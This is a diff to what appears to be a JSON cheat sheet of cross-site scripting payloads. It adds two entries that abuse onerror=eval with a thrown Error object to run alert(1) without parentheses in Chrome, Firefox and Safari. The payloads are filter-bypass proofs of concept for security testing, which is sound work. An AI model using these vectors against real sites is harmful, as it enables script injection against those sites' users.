@@ -275,5 +275,15 @@
     "code": "<script>onerror=eval,new name</script>",
     "browsers": ["safari"],
     "url": "https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href=%22//subdomain1.portswigger-labs.net/xss/xss.php?x=%3Cscript%3Eonerror=eval,new%20name%3C/script%3E%22target=%27%22-alert(1)//%27%3Etest%3C/a%3E"
+  },
+  {
+    "description": "onerror and Error object on Firefox and Safari",
+    "code": "<script>throw onerror=eval,x=new Error,x.message='alert\\x281\\x29',x</script>",
+    "browsers": ["safari", "firefox"]
+  },
+  {
+    "description": "onerror and Error object on Chrome",
+    "code": "<script>throw onerror=eval,x=new Error,x.name='',x.message='=alert\\x281\\x29',x</script>",
+    "browsers": ["chrome"]
   }
 ]
